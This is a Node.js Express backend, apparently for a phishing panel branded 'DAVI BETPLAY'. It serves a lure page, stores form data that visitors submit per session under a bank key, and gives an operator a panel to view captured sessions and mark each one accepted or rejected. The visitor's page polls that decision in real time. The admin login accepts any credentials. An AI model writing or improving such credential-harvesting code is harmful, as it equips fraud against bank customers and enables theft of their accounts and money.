const express = require('express');
const cors = require('cors');
const app = express();

app.use(cors());
app.use(express.json());

// Servir archivos estáticos (para que abra davi-betplay.html)
app.use(express.static(__dirname));

let sesiones = [];
let historial = [];
let stats = { activos: 0, sesiones: 0, pendientes: 0, bloqueadas: 0, historial: 0 };

// ---------- FRONTEND (usuario) ----------
app.post('/api/sesion', (req, res) => {
    const { sessionId, bancoKey, estado, paso, datos } = req.body;
    let sesion = sesiones.find(s => s.sessionId === sessionId);

    if (sesion) {
        sesion.estado = estado;
        sesion.paso = paso;
        sesion.datos = { ...sesion.datos, ...datos };
    } else {
        sesion = {
            id: Date.now(),
            sessionId,
            bancoKey,
            estado,
            paso,
            datos: { bancoKey, ...datos },
            fecha: new Date()
        };
        sesiones.push(sesion);
    }

    actualizarStats();
    res.json({ ok: true, sessionId });
});

// 🔥 NUEVA RUTA: Para que el usuario consulte si ya fue aceptado o rechazado 🔥
app.get('/api/sesion/:sessionId/estado', (req, res) => {
    const { sessionId } = req.params;
    const sesion = sesiones.find(s => s.sessionId === sessionId);
    
    if (!sesion) return res.status(404).json({ error: 'Sesión no encontrada' });
    
    res.json({ estado: sesion.estado });
});

// ---------- PANEL DAVI BETPLAY ----------
app.get('/admin/stats', (req, res) => {
    actualizarStats();
    res.json(stats);
});

app.get('/admin/sesiones', (req, res) => {
    res.json({ sesiones });
});

app.get('/admin/historial', (req, res) => {
    res.json({ historial });
});

app.post('/admin/login', (req, res) => {
    const { usuario, password } = req.body;
    if (usuario && password) {
        res.json({ token: 'davi-token-' + Date.now(), usuario });
    } else {
        res.status(401).json({ error: 'Credenciales inválidas' });
    }
});

// SOLO Aceptar o Rechazar
app.post('/admin/sesion/:sessionId/accion', (req, res) => {
    const { sessionId } = req.params;
    const { accion } = req.body;

    const sesion = sesiones.find(s => s.sessionId === sessionId);
    if (!sesion) return res.status(404).json({ error: 'Sesión no encontrada' });

    if (accion === 'ACEPTAR') sesion.estado = 'aceptado';
    else if (accion === 'RECHAZAR') sesion.estado = 'rechazado';
    else return res.status(400).json({ error: 'Acción no permitida' });

    historial.push({ ...sesion, fechaCierre: new Date() });

    res.json({ ok: true, estado: sesion.estado });
});

// Stubs para que no falle el panel
app.get('/admin/activos', (req, res) => res.json({ activos: [] }));
app.get('/admin/ips-bloqueadas', (req, res) => res.json({ ips: [] }));
app.get('/admin/logs', (req, res) => res.json({ logs: [] }));

function actualizarStats() {
    stats.sesiones = sesiones.length;
    stats.pendientes = sesiones.filter(s => s.estado === 'pendiente').length;
    stats.activos = sesiones.length;
    stats.historial = historial.length;
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Backend en puerto ${PORT}`));
